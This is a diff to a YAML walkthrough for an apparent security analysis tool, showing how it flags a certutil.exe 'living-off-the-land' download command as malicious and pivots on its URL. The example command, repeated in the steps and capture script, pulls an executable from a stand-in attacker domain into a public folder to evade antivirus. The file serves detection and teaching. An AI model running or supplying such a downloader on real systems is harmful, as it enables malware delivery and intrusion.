@@ -1,30 +1,51 @@
 id: payload_certutil_dropper
 title: Payload Example · certutil.exe LOLBAS Dropper
-purpose: The `certutil -urlcache -f <url> <path>` living-off-the-land trick — certutil.exe (a signed Microsoft binary) is abused to download a payload while evading AV. NivXRay flags the LOLBAS abuse and pivots on the URL.
+purpose: The `certutil -urlcache -f <url> <path>` living-off-the-land trick — certutil.exe
+  (a signed Microsoft binary) is abused to download a payload while evading AV. NivXRay
+  flags the LOLBAS abuse and pivots on the URL.
 steps:
-  - title: The raw command
-    action: Paste `cmd.exe /c certutil.exe -urlcache -split -f https://malicious.example[.]net/beacon.exe C:\\Users\\Public\\svc.exe` into the workspace.
-    expected: No decoding needed — this one is already plaintext.
-  - title: AUTO INVESTIGATE
-    action: Click AUTO INVESTIGATE. The engine skips decoders (nothing to decode) and jumps straight to threat analysis.
-    expected: Verdict = **Malicious**. MITRE = T1105 (Ingress Tool Transfer) + T1218 (Signed Binary Proxy Execution). LOLBAS tab lights up with `certutil.exe`.
-  - title: LOLBAS tab
-    action: Click LOLBAS. `certutil.exe` is listed with intent = Download, plus a link to lolbas-project.org.
-    expected: Confidence = high. Rule = "certutil.exe used as URL cache downloader".
-  - title: Pivot on the URL
-    action: In IOCS tab, click `malicious.example[.]net`.
-    expected: Domain gets enriched — VT/OTX verdicts render, WHOIS lookup fires.
-related_features: [threat_intel_enrichment, investigation_timeline, auto_investigate]
-
+- title: The raw command
+  action: Paste `cmd.exe /c certutil.exe -urlcache -split -f https://malicious.example[.]net/beacon.exe
+    C:\\Users\\Public\\svc.exe` into the workspace.
+  expected: No decoding needed — this one is already plaintext.
+- title: AUTO INVESTIGATE
+  action: Click AUTO INVESTIGATE. The engine skips decoders (nothing to decode) and
+    jumps straight to threat analysis.
+  expected: Verdict = **Malicious**. MITRE = T1105 (Ingress Tool Transfer) + T1218
+    (Signed Binary Proxy Execution). LOLBAS tab lights up with `certutil.exe`.
+- title: LOLBAS tab
+  action: Click LOLBAS. `certutil.exe` is listed with intent = Download, plus a link
+    to lolbas-project.org.
+  expected: Confidence = high. Rule = "certutil.exe used as URL cache downloader".
+- title: Pivot on the URL
+  action: In IOCS tab, click `malicious.example[.]net`.
+  expected: Domain gets enriched — VT/OTX verdicts render, WHOIS lookup fires.
+related_features:
+- threat_intel_enrichment
+- investigation_timeline
+- auto_investigate
 capture:
   login: true
   steps:
-    - url: /workspace
-      wait_for: '[data-testid="input-textarea"]'
-      type_into:
-        selector: '[data-testid="input-textarea"]'
-        text: 'cmd.exe /c certutil.exe -urlcache -split -f https://malicious.example[.]net/beacon.exe C:\Users\Public\svc.exe'
-      click_before: '[data-testid="btn-auto-investigate-inline"]'
-      delay_ms: 4000
-      post_click_ms: 6000
-      full_page: true
+  - url: /workspace
+    wait_for: '[data-testid="input-textarea"]'
+    type_into:
+      selector: '[data-testid="input-textarea"]'
+      text: cmd.exe /c certutil.exe -urlcache -split -f https://malicious.example[.]net/beacon.exe
+        C:\Users\Public\svc.exe
+    click_before: '[data-testid="btn-auto-investigate-inline"]'
+    delay_ms: 4000
+    post_click_ms: 6000
+    selectors:
+    - '[data-testid="input-card"]'
+    - '[data-testid="output-card"]'
+    - '[data-testid="threat-analysis-panel"]'
+    tabs:
+    - tab-graph
+    - tab-mitre
+    - tab-lolbas
+    - tab-iocs
+    - tab-ti-hits
+    - tab-osint
+    - tab-flow
+    - tab-chain
